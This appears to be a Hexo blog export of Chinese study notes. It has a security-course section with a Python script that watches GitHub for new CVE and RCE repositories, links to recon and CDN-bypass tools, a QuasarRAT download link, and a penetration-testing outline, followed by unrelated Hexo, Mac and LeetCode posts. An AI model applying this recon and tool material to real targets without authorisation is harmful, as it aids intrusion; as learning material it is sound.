<p><strong>总结</strong>：<br>主要是教怎么运用这个脚本做监控，信息收集是思路可以看下面这张图<br><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day10.webp"></p>
<h3 id="演示案例————监控最新的-EXP-发布及其他-（源代码）"><a href="#演示案例————监控最新的-EXP-发布及其他-（源代码）" class="headerlink" title="演示案例————监控最新的 EXP 发布及其他 （源代码）"></a>演示案例————监控最新的 EXP 发布及其他 （源代码）</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Title: wechat push CVE-2020</span><br><span class="line"># Date: 2020-5-9</span><br><span class="line"># Exploit Author: weixiao9188</span><br><span class="line"># Version: 4.0</span><br><span class="line"># Tested on: Linux,windows</span><br><span class="line"># cd /root/sh/git/ &amp;&amp; nohup python3 /root/sh/git/git.py &amp;</span><br><span class="line"># coding:UTF-8</span><br><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import pandas as pd</span><br><span class="line">time_sleep = 60   # 每隔 60 秒爬取一次</span><br><span class="line">while(True):</span><br><span class="line">    headers1 = &#123;</span><br><span class="line">                &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko)</span><br><span class="line">Chrome/70.0.3538.25 Safari/537.36 Core/1.70.3741.400 QQBrowser/10.5.3863.400&quot;&#125;</span><br><span class="line">    # 判断文件是否存在</span><br><span class="line">    datas = []</span><br><span class="line">    response1 = None</span><br><span class="line">    response2 = None</span><br><span class="line">    if os.path.exists(&quot;olddata.csv&quot;):</span><br><span class="line">    # 如果文件存在则每次爬取 10 个</span><br><span class="line">        df = pd.read_csv(&quot;olddata.csv&quot;, header=None)</span><br><span class="line">        datas = df.where(df.notnull(),None).values.tolist()#将提取出来的数据中的 nan 转化为 None</span><br><span class="line">        requests.packages.urllib3.disable_warnings()</span><br><span class="line">        response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE2020&amp;sort=updated&amp;per_page=10&quot;,headers=headers1,verify=False)</span><br><span class="line">        response2 =</span><br><span class="line">requests.get(url=&quot;https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;per_page=10&quot;,hea</span><br><span class="line">ders=headers1,verify=False)</span><br><span class="line">    else:</span><br><span class="line">    # 不存在爬取全部</span><br><span class="line">        datas = []</span><br><span class="line">        requests.packages.urllib3.disable_warnings()</span><br><span class="line">        response1 = requests.get(url=&quot;https://api.github.com/search/repositories?q=CVE2020&amp;sort=updated&amp;order=desc&quot;,headers=headers1,verify=False)</span><br><span class="line">        response2 =</span><br><span class="line">requests.get(url=&quot;https://api.github.com/search/repositories?q=RCE&amp;ssort=updated&amp;order=desc&quot;,heade</span><br><span class="line">rs=headers1,verify=False)</span><br><span class="line"></span><br><span class="line">    data1 = json.loads(response1.text)</span><br><span class="line">    data2 = json.loads(response2.text)</span><br><span class="line"></span><br><span class="line">    for j in [data1[&quot;items&quot;],data2[&quot;items&quot;]]:</span><br><span class="line">        for i in j:</span><br><span class="line">            s = &#123;&quot;name&quot;:i[&#x27;name&#x27;],&quot;html&quot;:i[&#x27;html_url&#x27;],&quot;description&quot;:i[&#x27;description&#x27;]&#125;</span><br><span class="line">            s1 =[i[&#x27;name&#x27;],i[&#x27;html_url&#x27;],i[&#x27;description&#x27;]]</span><br><span class="line">        if s1 not in datas:</span><br><span class="line">        # print(s1）</span><br></pre></td></tr></table></figure>


<h2 id="网站资源补充"><a href="#网站资源补充" class="headerlink" title="网站资源补充"></a>网站资源补充</h2><h3 id="cdn网站"><a href="#cdn网站" class="headerlink" title="cdn网站"></a>cdn网站</h3><ol>
<li>查询偏僻国家ip — <a href="http://tools.ipip.net/cdn.php">http://tools.ipip.net/cdn.php</a></li>
<li>查询域名的历史记录 — <a href="https://dnsdb.io/zh-cn">https://dnsdb.io/zh-cn</a></li>
<li>查询证书 — <a href="https://crt.sh/">https://crt.sh</a></li>
<li>查询子域名 — <a href="http://tools.bugscaner.com/">http://tools.bugscaner.com</a></li>
<li>扫全网IP工具 — <a href="https://github.com/Tai7sy/fuckcdn">https://github.com/Tai7sy/fuckcdn</a>  </li>
<li>扫描全网地址访问CDN获取网站IP — <a href="https://github.com/boy-hack/w8fuckcdn">https://github.com/boy-hack/w8fuckcdn</a>      </li>
</ol>
<h3 id="黑暗引擎"><a href="#黑暗引擎" class="headerlink" title="黑暗引擎"></a>黑暗引擎</h3><ol>
<li>shodan — shodan.io</li>
<li>zoomeye — zoomeye.org</li>
<li>fofa — fofa.so || fofa.info (目前上不去)</li>
</ol>
<h3 id="cms识别"><a href="#cms识别" class="headerlink" title="cms识别"></a>cms识别</h3><ul>
<li>云指纹(查cms的网站) — <a href="https://www.yunsee.cn/">https://www.yunsee.cn</a></li>
<li>在线cms指纹识别 — <a href="http://whatweb.bugscaner.com/">http://whatweb.bugscaner.com</a></li>
<li>指纹识别库 — <a href="https://github.com/Lucifer1993/cmsprint">https://github.com/Lucifer1993/cmsprint</a></li>
</ul>
<h3 id="资源网站"><a href="#资源网站" class="headerlink" title="资源网站"></a>资源网站</h3><ul>
<li>墨者学院(网安人才培养学习平台) — mozhe.cn </li>
<li>Vulhub 靶场(Web中间件常见漏洞总结) — <a href="https://www.vulhub.org/">https://www.vulhub.org/</a></li>
<li>CTF比赛例题网站 — <a href="https://ctf.bugku.com/challenges">https://ctf.bugku.com/challenges</a> </li>
</ul>
<h3 id="其他工具"><a href="#其他工具" class="headerlink" title="其他工具"></a>其他工具</h3><ol>
<li>安卓模拟器 — <a href="http://www.xyaz.cn/">http://www.xyaz.cn</a></li>
<li>wsexplorer 抓包工具 — <a href="http://www.downcc.com/soft/11196.html">http://www.downcc.com/soft/11196.html</a>       </li>
<li>这个不知道是github的什么项目 — <a href="https://github.com/quasar/QuasarRAT/releases">https://github.com/quasar/QuasarRAT/releases</a></li>
<li>漏了个大洞 — <a href="https://pan.baidu.com/s/13_i1ExwEaA59GfMt1Rp0Hg">https://pan.baidu.com/s/13_i1ExwEaA59GfMt1Rp0Hg</a> 提取码：0b7b</li>
<li>github监视器 — <a href="https://github.com/M4tir/Github-Monitor">https://github.com/M4tir/Github-Monitor</a></li>
<li>各个语言与框架存在的漏洞 — <a href="https://websec.readthedocs.io/zh/latest/language/index.html">https://websec.readthedocs.io/zh/latest/language/index.html</a></li>
<li>nmap(端口扫描工具) — <a href="https://nmap.org/">https://nmap.org/</a></li>
<li>CMD5在线解密 — <a href="https://www.cmd5.com/">https://www.cmd5.com</a>   </li>
<li>在线加密解密工具 — <a href="http://tool.chacuo.net/cryptaes">http://tool.chacuo.net/cryptaes</a>    </li>
<li>Discuz! Q — <a href="https://gitee.com/ComsenzDiscuz/DiscuzX">https://gitee.com/ComsenzDiscuz/DiscuzX</a></li>
<li>多个地点ping服务器 — <a href="http://ping.chinaz.com/">http://ping.chinaz.com</a></li>
<li>验证网站IP — <a href="https://www.get-site-ip.com/">https://www.get-site-ip.com/</a></li>
<li>国外地址请求 — <a href="https://asm.ca.com/en/ping.php">https://asm.ca.com/en/ping.php</a></li>
<li>同IP网站查询 — <a href="https://www.webscan.cc/">https://www.webscan.cc/</a>  </li>
<li>Web应用程序防火墙指纹识别工具 — <a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a>  </li>
<li>站长之家 — <a href="http://tool.chinaz.com/">http://tool.chinaz.com</a></li>
<li>高精度IP定位 — opengps.cn</li>
</ol>
<h1 id="WEB漏洞"><a href="#WEB漏洞" class="headerlink" title="WEB漏洞"></a>WEB漏洞</h1><h2 id="Day11-WEB漏洞——必懂知识点详解"><a href="#Day11-WEB漏洞——必懂知识点详解" class="headerlink" title="Day11 WEB漏洞——必懂知识点详解"></a>Day11 WEB漏洞——必懂知识点详解</h2><p><img src="/2022/08/12/%E3%80%8A%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%E3%80%8B%E8%AF%BE%E7%A8%8B%E9%9A%8F%E8%AE%B0/Day11-Web.webp"></p>
<h3 id="CTF，SRC，红蓝对抗，实战等"><a href="#CTF，SRC，红蓝对抗，实战等" class="headerlink" title="CTF，SRC，红蓝对抗，实战等"></a>CTF，SRC，红蓝对抗，实战等</h3><h4 id="简要说明以上漏洞危害情况"><a href="#简要说明以上漏洞危害情况" class="headerlink" title="简要说明以上漏洞危害情况"></a>简要说明以上漏洞危害情况</h4><ol>
<li>获取网站的数据库的权限（数据），后台账号和密码: SQL注入</li>
<li>直接获取网站权限: 文件上传</li>
</ol>
<h4 id="简要说明以上漏洞等级划分"><a href="#简要说明以上漏洞等级划分" class="headerlink" title="简要说明以上漏洞等级划分"></a>简要说明以上漏洞等级划分</h4><ol>
<li>高危：文件上传、SQL注入、代码执行、文件包含、未授权访问</li>
<li>中危：逻辑安全、目录遍历</li>
<li>低危：信息泄露 — 源码、部分账号密码</li>
</ol>
<h4 id="简要说明以上漏洞重点内容"><a href="#简要说明以上漏洞重点内容" class="headerlink" title="简要说明以上漏洞重点内容"></a>简要说明以上漏洞重点内容</h4><ol>
<li>CTF：SQL注入、反序列化、代码执行</li>
<li>SRC：以上都有，逻辑安全 — 0元购买</li>
<li>红蓝对抗：高危漏洞 — 权限</li>
</ol>
<h4 id="简要说明以上漏洞形势问题"><a href="#简要说明以上漏洞形势问题" class="headerlink" title="简要说明以上漏洞形势问题"></a>简要说明以上漏洞形势问题</h4><p>SQL注入网上没有：信息收集少；知识点不够；网站上确实没有此漏洞</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
      </tags>
  </entry>
  <entry>
    <title>网站渗透测试流程</title>
    <url>/2022/07/04/%E7%BD%91%E7%AB%99%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<span id="more"></span>


<h2 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h2><ol>
<li>确定范围：测试目标的范围，IP、域名、内外网</li>
<li>确定规则：能渗透到什么程度，时间？能否修改上传？能否提权等</li>
<li>确定需求：web应用的漏洞（新上线程序）？业务逻辑漏洞（针对业务的）？人员权限管理漏洞（针对人员、权限）？等等</li>
<li>根据需求和技术能力来确定自己能不能做，能做多少</li>
</ol>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ol>
<li>方式：主动扫描、开放搜索等</li>
<li>开放搜索：利用搜索引擎获得、后台、未授权页面、敏感URL等</li>
<li>基础信息：IP、网段、域名、端口</li>
<li>系统信息：操作系统版本</li>
<li>应用信息：各端口的应用，例如web应用、邮件应用等</li>
<li>版本信息：所有这些探测到的东西的版本</li>
<li>服务信息</li>
<li>人员信息：域名注册人员信息、web应用中网站发帖ID、管理员姓名等</li>
<li>防护信息：试着看能否探测到防护设备</li>
</ol>
<h2 id="漏洞探测"><a href="#漏洞探测" class="headerlink" title="漏洞探测"></a>漏洞探测</h2><p>利用上一步列出的各种系统和应用等相应的漏洞</p>
<ol>
<li>方法：<ul>
<li>漏扫、AWVS、IBM appscan等</li>
<li>结合漏洞去exploit-db等位置找利用</li>
<li>网上寻找验证poc</li>
</ul>
</li>
<li>内容：<ul>
<li>系统漏洞：系统没有及时打补丁</li>
<li>Webserver漏洞：Webserver配置问题</li>
<li>Web应用漏洞：Web应用开发问题</li>
<li>其他端口服务漏洞：各种21/8080(st2)/7001/22/3389</li>
<li>通信安全：明文传输、token在cookie中传输等</li>
</ul>
</li>
</ol>
<h2 id="漏洞验证"><a href="#漏洞验证" class="headerlink" title="漏洞验证"></a>漏洞验证</h2><p>将上一步发现的有可能可以成功利用的全部漏洞都验证一边，结合实际情况搭建模拟环境试验，成功后再应用于目标中</p>
<ul>
<li>自动化验证：结合自动化扫描工具提供的结果</li>
<li>手工验证：根据公开资源进行验证</li>
<li>试验验证：自己搭建模拟环境进行验证</li>
<li>登陆猜解：有时可以尝试猜测破解一下登录的账号密码等信息</li>
<li>业务漏洞验证：如发现业务漏洞要进行验证</li>
</ul>
<h2 id="形成报告"><a href="#形成报告" class="headerlink" title="形成报告"></a>形成报告</h2><ol>
<li>按需整理：按照之前第一步跟客户确定好的范围、需求来整理资料，并将其形成报告</li>
<li>补充介绍：对漏洞成因、验证过程和带来危害进行分析</li>
<li>修补建议：对所有产生的问题提出合理高效安全的解决办法</li>
</ol>
<hr>
<h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><p><a href="https://www.bilibili.com/video/BV1kT411576m?p=9&share_source=copy_web">哔哩哔哩网站渗透测试流程教程</a></p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>网络安全</tag>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>解决Hexo部署Github时页面显示问题</title>
    <url>/2022/08/12/%E8%A7%A3%E5%86%B3Hexo%E9%83%A8%E7%BD%B2Github%E6%97%B6%E9%A1%B5%E9%9D%A2%E6%98%BE%E7%A4%BA%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>检查 <code>_config.yml</code> 文件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Deployment</span><br><span class="line">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repository: git@github.com:xinkjung  # 仓库地址</span><br><span class="line">  branch: master  # hexo </span><br></pre></td></tr></table></figure>

<p>发现不知道什么时候改为了 <code>hexo</code> ，文件都上传到 <code>hexo</code> 目录下去了，修改为 <code>master</code> 即可。</p>
<p>然后执行命令 <code>hexo clean</code>、<code>hexo d -g</code>尝试，这样就成功解决了。</p>
]]></content>
      <tags>
        <tag>Hexo</tag>
        <tag>Blog</tag>
        <tag>Github</tag>
      </tags>
  </entry>
  <entry>
    <title>配置MAC终端自动补全命令行</title>
    <url>/2022/08/02/%E9%85%8D%E7%BD%AEMAC%E7%BB%88%E7%AB%AF%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E5%91%BD%E4%BB%A4%E8%A1%8C/</url>
    <content><![CDATA[<ol>
<li>打开终端，在命令行输入 <code>nano .inputrc</code> 然后回车运行会进入一个编辑页面</li>
<li>将下列语句输入到文件中：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set completion-ignore-case on</span><br><span class="line">set show-all-if-ambiguous on</span><br><span class="line">TAB: menu-complete</span><br></pre></td></tr></table></figure>
<img src="/2022/08/02/%E9%85%8D%E7%BD%AEMAC%E7%BB%88%E7%AB%AF%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E5%91%BD%E4%BB%A4%E8%A1%8C/1.inputrc.png" alt=".inputrc"></li>
<li>输入完成之后 <code>Control + O</code> 保存文件然后按回车，之后 <code>Control + X</code> 退出编辑页面，然后重启终端就可以了（可以再次执行步骤1检查是否正确输入）<br><img src="/2022/08/02/%E9%85%8D%E7%BD%AEMAC%E7%BB%88%E7%AB%AF%E8%87%AA%E5%8A%A8%E8%A1%A5%E5%85%A8%E5%91%BD%E4%BB%A4%E8%A1%8C/2.success.png" alt="success"></li>
</ol>
<hr>
<p><strong>参考链接</strong></p>
<p><a href="https://blog.csdn.net/qq_41134710/article/details/118573124">如何配置MAC的终端自动补全命令行</a></p>
]]></content>
      <categories>
        <category>配置</category>
      </categories>
      <tags>
        <tag>Mac</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构算法题分析</title>
    <url>/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<h1 id="数据结构入门"><a href="#数据结构入门" class="headerlink" title="数据结构入门"></a>数据结构入门</h1><h2 id="第1天-数组"><a href="#第1天-数组" class="headerlink" title="第1天 数组"></a>第1天 数组</h2><h3 id="217-存在重复元素-【简单】"><a href="#217-存在重复元素-【简单】" class="headerlink" title="217.存在重复元素 【简单】"></a>217.存在重复元素 【简单】</h3><h4 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一个整数数组 <code>nums</code> 。如果任一值在数组中出现 <strong>至少两次</strong> ，返回 <code>true</code> ；如果数组中每个元素互不相同，返回 <code>false</code> 。</p>
<p><strong>示例 1：</strong><br><code>输入：nums = [1,2,3,1] 输出：true</code></p>
<p><strong>示例 2：</strong><br><code>输入：nums = [1,2,3,4] 输出：false</code></p>
<p><strong>示例 3：</strong><br><code>输入：nums = [1,1,1,3,3,4,3,2,4,2] 输出：true</code></p>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">containsDuplicate</span>(<span class="params">self, nums</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: bool</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(nums) != <span class="built_in">len</span>(<span class="built_in">set</span>(nums)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>


<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>利用python中的set()方法可以实现将对象去重（即去掉数组中重复的元素），比较去重前后的对象长度即可</p>
<h3 id="53-最大子数组和-【中等】"><a href="#53-最大子数组和-【中等】" class="headerlink" title="53.最大子数组和 【中等】"></a>53.最大子数组和 【中等】</h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你一个整数数组 <code>nums</code> ，请你找出一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。</p>
<p><strong>子数组</strong> 是数组中的一个连续部分。</p>
<p><strong>示例 1：</strong><br><code>输入：nums = [-2,1,-3,4,-1,2,1,-5,4] 输出：6 解释：连续子数组 [4,-1,2,1] 的和最大，为 6 。</code></p>
<p><strong>示例 2：</strong><br><code>输入：nums = [1] 输出：1</code></p>
<p><strong>示例 3：</strong><br><code>输入：nums = [5,4,-1,7,8] 输出：23</code></p>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">maxSubArray</span>(<span class="params">self, nums</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :rtype: int</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        res = nums[<span class="number">0</span>]    <span class="comment"># 累加结果，记录当前最大值</span></span><br><span class="line">        pre = <span class="number">0</span>          <span class="comment"># 判断负数不做相加（当下一个数为负数时立刻放弃，重新计算）</span></span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">if</span> pre &gt; <span class="number">0</span>:</span><br><span class="line">                pre += n</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                pre = n</span><br><span class="line">            res = <span class="built_in">max</span>(pre, res)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>


<h4 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h4><p>采用<strong>贪心算法</strong>，解题思路：</p>
<ul>
<li>局部最优： 从第一个元素开始向后遍历，当“连续累加和”为负数时，说明前面这些数只能成为后边数的累赘，因此从下一个元素重新开始（即pre初始化为0）继续向后累加</li>
<li>全局最优：选取最大“连续和”</li>
</ul>
<p>局部最优的情况下，记录最大的“连续和”，就可以推出全局最优。</p>
<p>代码：遍历 <code>nums</code>，从头开始用 <code>pre</code> 累积，如果 <code>pre</code> 一旦加上 <code>nums[i]</code> 变为负数，那么就应该从 <code>nums[i+1]</code> 开始从 0 累积了，因为已经变为负数的 <code>pre</code>，只会拖累总和，相当于是用<code>res</code> 记录最大子序和区间和（变相的算是调整了终止位置）</p>
<p>这里需要注意的是：遍历每个元素都会让pre和res比较取二者最大值作为新的res（遍历完整个序列，就代表找到了全局最优res），操作完这个步骤后再判断是否pre需要初始化</p>
<img src="/2022/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/10/04/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AE%97%E6%B3%95%E9%A2%98%E5%88%86%E6%9E%90/53.gif" class>



<h2 id="第2天-数组"><a href="#第2天-数组" class="headerlink" title="第2天 数组"></a>第2天 数组</h2><h3 id="1-两数之和-【简单】"><a href="#1-两数之和-【简单】" class="headerlink" title="1. 两数之和 【简单】"></a>1. 两数之和 【简单】</h3><h4 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个整数数组 <code>nums</code> 和一个整数目标值 <code>target</code>，请你在该数组中找出 <strong>和为目标值</strong> <code>target</code>  的那 <strong>两个</strong> 整数，并返回它们的数组下标。</p>
<p>你可以假设每种输入只会对应一个答案。但是，数组中同一个元素在答案里不能重复出现。</p>
<p>你可以按任意顺序返回答案。</p>
<p><strong>示例 1：</strong></p>
<p><code>输入：nums = [2,7,11,15], target = 9 输出：[0,1] 解释：因为 nums[0] + nums[1] == 9 ，返回 [0, 1] 。</code></p>
<p><strong>示例 2：</strong><br><code>输入：nums = [3,2,4], target = 6 输出：[1,2]</code></p>
<p><strong>示例 3：</strong><br><code>输入：nums = [3,3], target = 6 输出：[0,1]</code></p>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">twoSum</span>(<span class="params">self, nums, target</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums: List[int]</span></span><br><span class="line"><span class="string">        :type target: int</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(nums)):</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(i+<span class="number">1</span>, <span class="built_in">len</span>(nums)):</span><br><span class="line">                <span class="keyword">if</span> nums[i]+nums[j] == target:</span><br><span class="line">                    <span class="keyword">return</span> [i,j]</span><br></pre></td></tr></table></figure>


<h4 id="分析-2"><a href="#分析-2" class="headerlink" title="分析"></a>分析</h4><p><strong>暴力破解</strong> ：遍历 nums 数组，对数组中的元素进行两两相加，当和为 target 时返回下标。<br>注意不能是同一个元素相加，为了简洁每次循环从相邻的元素开始往后挨个相加。</p>
<h3 id="88-合并两个有序数组-【简单】"><a href="#88-合并两个有序数组-【简单】" class="headerlink" title="88.合并两个有序数组 【简单】"></a>88.合并两个有序数组 【简单】</h3><h4 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你两个按 <strong>非递减顺序</strong> 排列的整数数组 <code>nums1</code> 和 <code>nums2</code>，另有两个整数 <code>m</code> 和 <code>n</code> ，分别表示 <code>nums1</code> 和 <code>nums2</code> 中的元素数目。</p>
<p>请你 <strong>合并</strong> <code>nums2</code> 到 <code>nums1</code> 中，使合并后的数组同样按 <strong>非递减顺序</strong> 排列。</p>
<p>注意：最终，合并后数组不应由函数返回，而是存储在数组 <code>nums1</code> 中。为了应对这种情况，<code>nums1</code> 的初始长度为 <code>m + n</code>，其中前 <code>m</code> 个元素表示应合并的元素，后 <code>n</code> 个元素为 <code>0</code> ，应忽略。<code>nums2</code> 的长度为 <code>n</code> 。</p>
<p><strong>示例 1：</strong><br><code>输入：nums1 = [1,2,3,0,0,0], m = 3, nums2 = [2,5,6], n = 3 输出：[1,2,2,3,5,6] 解释：需要合并 [1,2,3] 和 [2,5,6] 。 合并结果是 [1,2,2,3,5,6] ，其中斜体加粗标注的为 nums1 中的元素。</code></p>
<p><strong>示例 2：</strong><br><code>输入：nums1 = [1], m = 1, nums2 = [], n = 0 输出：[1] 解释：需要合并 [1] 和 [] 。 合并结果是 [1] 。</code></p>
<p><strong>示例 3：</strong><br><code>输入：nums1 = [0], m = 0, nums2 = [1], n = 1 输出：[1] 解释：需要合并的数组是 [] 和 [1] 。 合并结果是 [1] 。 注意，因为 m = 0 ，所以 nums1 中没有元素。nums1 中仅存的 0 仅仅是为了确保合并结果可以顺利存放到 nums1 中。</code></p>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">merge</span>(<span class="params">self, nums1, m, nums2, n</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums1: List[int]</span></span><br><span class="line"><span class="string">        :type m: int</span></span><br><span class="line"><span class="string">        :type nums2: List[int]</span></span><br><span class="line"><span class="string">        :type n: int</span></span><br><span class="line"><span class="string">        :rtype: None Do not return anything, modify nums1 in-place instead.</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">            nums1[m+i] = nums2[i]</span><br><span class="line">        nums1.sort()</span><br><span class="line">        <span class="keyword">return</span> nums1</span><br></pre></td></tr></table></figure>


<h4 id="分析-3"><a href="#分析-3" class="headerlink" title="分析"></a>分析</h4><p>相当于对 nums1 数组从第 m+1 个元素开始进行赋值 nums2 数组，也就是把 nums2 数组拼接到nums1 数组后，然后对其排序即可。</p>
<p>python可以直接使用sort()函数进行非递减顺序排序。</p>
<h2 id="第3天-数组"><a href="#第3天-数组" class="headerlink" title="第3天 数组"></a>第3天 数组</h2><h3 id="350-两个数组的交集-II-【简单】"><a href="#350-两个数组的交集-II-【简单】" class="headerlink" title="350. 两个数组的交集 II 【简单】"></a>350. 两个数组的交集 II 【简单】</h3><h4 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h4><p>给你两个整数数组 <code>nums1</code> 和 <code>nums2</code> ，请你以数组形式返回两数组的交集。返回结果中每个元素出现的次数，应与元素在两个数组中都出现的次数一致（如果出现次数不一致，则考虑取较小值）。可以不考虑输出结果的顺序。</p>
<p><strong>示例 1：</strong><br><code>输入：nums1 = [1,2,2,1], nums2 = [2,2] 输出：[2,2]</code></p>
<p><strong>示例 2:</strong><br><code>输入：nums1 = [4,9,5], nums2 = [9,4,9,8,4] 输出：[4,9]</code></p>
<h4 id="代码-4"><a href="#代码-4" class="headerlink" title="代码"></a>代码</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">intersect</span>(<span class="params">self, nums1, nums2</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        :type nums1: List[int]</span></span><br><span class="line"><span class="string">        :type nums2: List[int]</span></span><br><span class="line"><span class="string">        :rtype: List[int]</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        res = []</span><br><span class="line">        <span class="keyword">for</span> n <span class="keyword">in</span> nums1:</span><br><span class="line">            <span class="keyword">if</span> n <span class="keyword">in</span> nums2 <span class="keyword">and</span> res.count(n) &lt; nums2.count(n):</span><br><span class="line">                res.append(n)</span><br><span class="line">        <span class="keyword">return</span> res</span><br></pre></td></tr></table></figure>


<h4 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h4><p>python可以直接判断数据是否存在于数组内，这里注意不论是从 nums1 开始向 nums2 中比较数字还是反过来，最终结果里数字出现的数字都不能超过两个数组中的最小次数，所以在加入 res 时，要判断res 中的次数是否小于另一个数组中的次数。</p>
<h3 id="121-买卖股票的最佳时机-【简单】"><a href="#121-买卖股票的最佳时机-【简单】" class="headerlink" title="121. 买卖股票的最佳时机 【简单】"></a>121. 买卖股票的最佳时机 【简单】</h3><h4 id="题目描述-5"><a href="#题目描述-5" class="headerlink" title="题目描述"></a>题目描述</h4><p>给定一个数组 <code>prices</code> ，它的第 <code>i</code> 个元素 <code>prices[i]</code> 表示一支给定股票第 <code>i</code> 天的价格。</p>
<p>你只能选择 <strong>某一天</strong> 买入这只股票，并选择在 <strong>未来的某一个不同的日子</strong> 卖出该股票。设计一个算法来计算你所能获取的最大利润。</p>
